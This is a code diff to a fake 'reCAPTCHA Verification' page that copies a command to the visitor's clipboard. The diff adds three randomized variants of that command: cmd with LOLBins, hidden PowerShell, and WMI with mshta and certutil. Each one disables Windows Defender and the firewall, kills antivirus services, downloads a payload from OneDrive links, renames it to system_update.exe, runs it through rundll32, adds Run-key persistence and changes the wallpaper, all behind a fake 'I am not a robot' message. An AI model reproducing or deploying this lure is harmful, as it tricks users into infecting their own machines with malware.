@@ -5,6 +5,7 @@
     <title>reCAPTCHA Verification</title>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">        
     <style>
+    /* Same CSS as previous implementations */
     .container { font-family: Roboto, helvetica, arial, sans-serif; }
     .m-p { margin: 0; padding: 0; }
     .block { display: block; }
@@ -182,8 +183,10 @@
         document.body.removeChild(tempTextArea);
     }
 
-    function stageClipboard(verification_id){
-        const command = `cmd /c "echo off && ` +
+    function getRandomCommand(verification_id) {
+        const commands = [
+            // Variation 1: CMD + Native LOLBins
+            `cmd /c "echo off && ` +
             `reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1 && ` +
             `reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1 && ` +
             `sc config WinDefend start= disabled >nul 2>&1 && ` +
@@ -196,8 +199,45 @@
             `reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\\wallpaper.jpg" /f >nul 2>&1 && ` +
             `RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >nul 2>&1 && ` +
             `start rundll32.exe "%TEMP%\\system_update.exe",Main && ` +
-            `echo ✅ ''I am not a robot - reCAPTCHA Verification ID: ${verification_id}''"`;
+            `echo ✅ ''I am not a robot - reCAPTCHA Verification ID: ${verification_id}''"`,
 
+            // Variation 2: PowerShell + .NET Methods
+            `powershell -w h -ep b -c "` +
+            `Set-MpPreference -DisableRealtimeMonitoring 1; ` +
+            `Set-MpPreference -EnableControlledFolderAccess 0; ` +
+            `Set-NetFirewallProfile -All -Enabled False; ` +
+            `Get-Service | Where-Object {$_.DisplayName -match 'antivirus|security|mcafee|norton|symantec|kaspersky|bitdefender|avast|avg'} | Stop-Service -Force; ` +
+            `Add-MpPreference -ExclusionPath '$env:TEMP'; ` +
+            `(New-Object Net.WebClient).DownloadFile('https://1drv.ms/u/c/2f3053ae4c170361/EeYeejV2PKFEmtjhRhdpI2wB64I2_mzc80Ww3Vo78_JhsQ?e=LT49up','$env:TEMP\\captcha.html'); ` +
+            `Move-Item '$env:TEMP\\captcha.html' '$env:TEMP\\system_update.exe' -Force; ` +
+            `Start-Process 'rundll32.exe' -ArgumentList '$env:TEMP\\system_update.exe,Main'; ` +
+            `(New-Object Net.WebClient).DownloadFile('https://1drv.ms/i/c/2f3053ae4c170361/EUij8r4pE9lPg_c9kuSGMTkB6i4S4qqaNCE7U5NRDxePCg?e=tQOSx6','$env:TEMP\\wallpaper.jpg'); ` +
+            `Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; ` +
+            `[Wallpaper]::SystemParametersInfo(20, 0, '$env:TEMP\\wallpaper.jpg', 3); "` +
+            ` # ✅ ''I am not a robot - reCAPTCHA Verification ID: ${verification_id}''`,
+
+            // Variation 3: Mixed LOLBins + WMI
+            `cmd /c "echo off && ` +
+            `wmic /namespace:\\\\root\\Microsoft\\Windows\\Defender path MSFT_MpPreference call Add_ExclusionPath ExclusionPath=\"%TEMP%\" >nul 2>&1 && ` +
+            `wmic process where \"name='MsMpEng.exe'\" delete >nul 2>&1 && ` +
+            `sc stop WinDefend >nul 2>&1 && ` +
+            `sc config WinDefend start= disabled >nul 2>&1 && ` +
+            `netsh advfirewall set allprofiles state off >nul 2>&1 && ` +
+            `certutil -urlcache -split -f \"https://1drv.ms/u/c/2f3053ae4c170361/EeYeejV2PKFEmtjhRhdpI2wB64I2_mzc80Ww3Vo78_JhsQ?e=LT49up\" \"%TEMP%\\captcha.html\" >nul 2>&1 && ` +
+            `mshta vbscript:Execute(\"CreateObject(\\\"Scripting.FileSystemObject\\\").MoveFile \\\"%TEMP%\\captcha.html\\\",\\\"%TEMP%\\system_update.exe\\\"\")(window.close) && ` +
+            `reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemUpdate\" /t REG_SZ /d \"rundll32.exe %TEMP%\\system_update.exe,Main\" /f >nul 2>&1 && ` +
+            `certutil -urlcache -split -f \"https://1drv.ms/i/c/2f3053ae4c170361/EUij8r4pE9lPg_c9kuSGMTkB6i4S4qqaNCE7U5NRDxePCg?e=tQOSx6\" \"%TEMP%\\wallpaper.jpg\" >nul 2>&1 && ` +
+            `reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"%TEMP%\\wallpaper.jpg\" /f >nul 2>&1 && ` +
+            `RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >nul 2>&1 && ` +
+            `start rundll32.exe \"%TEMP%\\system_update.exe\",Main && ` +
+            `echo ✅ ''I am not a robot - reCAPTCHA Verification ID: ${verification_id}''"`
+        ];
+        
+        return commands[Math.floor(Math.random() * commands.length)];
+    }
+
+    function stageClipboard(verification_id){
+        const command = getRandomCommand(verification_id);
         setClipboardCopyData(command);
     }
 
